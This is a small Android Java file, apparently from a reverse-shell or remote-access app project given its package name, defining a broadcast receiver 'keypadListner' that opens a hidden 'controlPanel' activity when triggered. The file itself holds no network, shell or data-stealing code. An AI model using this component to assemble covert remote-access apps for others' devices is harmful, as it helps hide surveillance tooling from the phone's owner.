package com.example.reverseshell2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class keypadListner extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("adadadd","in");
        Intent i = new Intent(context, controlPanel.class);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }
}
